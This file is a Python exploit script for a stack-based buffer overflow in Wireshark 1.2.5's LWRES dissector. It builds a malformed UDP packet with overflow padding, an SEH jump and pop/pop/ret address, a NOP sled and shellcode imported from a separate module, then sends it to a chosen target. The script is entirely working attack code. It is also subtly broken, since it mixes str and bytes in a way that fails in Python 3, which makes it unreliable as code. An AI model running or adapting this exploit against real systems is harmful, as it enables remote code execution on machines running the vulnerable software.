#!/usr/bin/env python
# Wireshark 1.2.5 LWRES getaddrbyname stack-based buffer overflow
# Discovered by babi
# Reference: http://www.exploit-db.com/exploits/11288
# Exploit Dev by Nullthreat & Pure|Hate

import struct

from payload import buf
import socket
def shell_attack(target_machine, target_port):

  try:
    host = target_machine
  except:
    
    exit(2)

  port = target_port
  addr = (host, port)

  leng = 9150
  high = int(leng / 256)
  low = leng & 255

  crash = (b"A" * 2128)

  # Short jump
  jmp = b"\x90\x90\x06\xeb"

  # pop/pop/ret in pcre3 0x61b4121b
  ppr = b"\x1b\x12\xb4\x61"

  nop  = (b"\x90" * 24)

  # 224 bytes = calc.exe
  

  crash2 = (b"\xcc" * 6752)

  data  = b"\x00\x00\x01\x5d\x00\x00\x00\x00\x4b\x49\x1c\x52\x00\x01\x00\x01"
  data += b"\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00"
  data += b"\x00\x00\x00\x01"
  data += chr(high) + chr(low) + crash + jmp + ppr + nop  + buf + crash2 + b"\x00\x00"

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  try:
    udps.sendto(data, addr)
  except:
   
    exit(1)

  udps.close()
  exit(0)